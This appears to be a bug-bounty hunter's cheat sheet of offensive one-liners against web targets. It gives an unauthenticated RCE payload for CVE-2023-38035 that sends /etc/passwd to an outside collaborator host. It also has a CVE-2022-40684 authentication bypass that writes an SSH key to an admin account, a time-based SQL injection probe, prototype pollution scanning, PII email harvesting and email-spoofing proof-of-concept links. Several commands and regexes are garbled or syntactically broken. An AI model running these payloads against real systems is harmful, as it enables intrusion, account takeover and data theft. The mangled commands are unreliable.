---
tags:
  - web_hunting
---

```bash
# Grep emails and other PII Data from URLs file
grep -E -o '\\\\\\\\b[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\\\\\\\.[a-zA-Z]{2,}\\\\\\\\b' urls.txt

#Extract Endpoints from JavaScript
cat FILE.js | grep -oh "\\\\\\\\"\\\\\\\\/[a-zA-Z0-9_/?=&]&\\\\\\\\""| sed -e 's/^"//' -e 's/"$//' | sort -u

#Get CIDR & Org Information from Target Lists
for HOST in $(cat HOSTS.txt); do echo (for ip in $(dig a $HOST +short); do whois $ip | grep -e "CIDR\\\\\\\\|Organization" | tr -s " | paste -; done | uniq); done
"
#Prototype Pollution
subfinder -d HOST -all -silent ❘ httpx -silent -threads 300 | anew -q FILE.txt && sed 's/$/\\\\\\\\/?_proto_[testparam]=exploit\\\\\\\\//' FILE.txt | page- fetch -j 'window.testparam == "exploit"? "[VULNERABLE]": "[NOT VULNERABLE]" | sed "s/(//g" sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"
'
# sitemap xss
cat urls.txt | httpx -silent -path 'sitemap.xml?offset=1%3bSELECT%20IF((8303%3E8302)%2cSLEEP(10)%2c2356)%23' -rt -timeout 20 -mrt '>10'

# Authentication Bypass (CVE-2022-40684) POC --> <https://twitter.com/h4x0r_dz/status/1580648642750296064/photo/1>
ffuf -w "host_list.txt:URL" -u "<https://URL/api/v2/cmdb/system/admin/admin>" -X PUT -H 'User-Agent: Report Runner' -H 'Content-Type: application/json' -H 'Forwarded: for="[127.0.0.1]:8000";by=”[127.0.0.1]:9000";' -d '{"ssh-public-key1": "h4x0r"}' -mr "SSH" -r

## CVE-2023-26256 -> <https://github.com/aodsec/CVE-2023-26256>
git clone <https://github.com/aodsec/CVE-2023-26256.git>
python3 CVE-2023-26256.py -h

# CVE-2023-38035 - Unauth. RCE
python3 -c "from pyhessian.client import HessianProxy as H; H('https://TARGET-DOMAIN:8443/mics/services/MICSLogService').uploadFileUsingFileInput({'command': 'curl -X POST -d @/etc/passwd [BURP-COLLABORATOR-URL.com](https://burp-collaborator-url.com/)', 'isRoot': True}, None)"

# Quick Port Scanning with Fuzzing
cat ips.txt|naabu -silent -tp 1000 -o top1k.txt;cat top1k.txt|grep -vE ':80|:443' | httpx -silent -fc 400,503,204,405 -o httpx.txt;cat httpx.txt|python3 [dirsearch.py](https://dirsearch.py/) --stdin -e '*' -t 60 -w onelistforall.txt -i 200,301,302 --format plain -o report.txt

# SSRF use Autorize Exxtension Match and replace 
https?://(www.)?[-a-zA-Z0–9@:%.+~#=]{1,256}.[a-zA-Z0–9()]{1,6}\b([-a-zA-Z0–9()@:%+.~#?&//=]*)

```
# Mail Server Misconfiguration
## No Valid SPF Records / No DMARC Record
check all domains here: [SPF Query Tool (kitterman.com)](https://www.kitterman.com/spf/validate.html?)
POC With: [Emkei's Fake Mailer](https://emkei.cz/) | [Mail Server Misconfiguration | Bug Bounty PoC | 0xKayala - YouTube](https://www.youtube.com/watch?v=p8L_MAJ0byU)
check with : [MX Lookup Tool - Check your DNS MX Records online - MxToolbox](https://mxtoolbox.com/)
### **References**
[How To use an SPF Record to Prevent Spoofing & Improve E-mail Reliability | DigitalOcean](https://www.digitalocean.com/community/tutorials/how-to-use-an-spf-record-to-prevent-spoofing-improve-e-mail-reliability)
[Chainlink | Report #629087 - No Valid SPF Records. | HackerOne](https://hackerone.com/reports/629087)

------
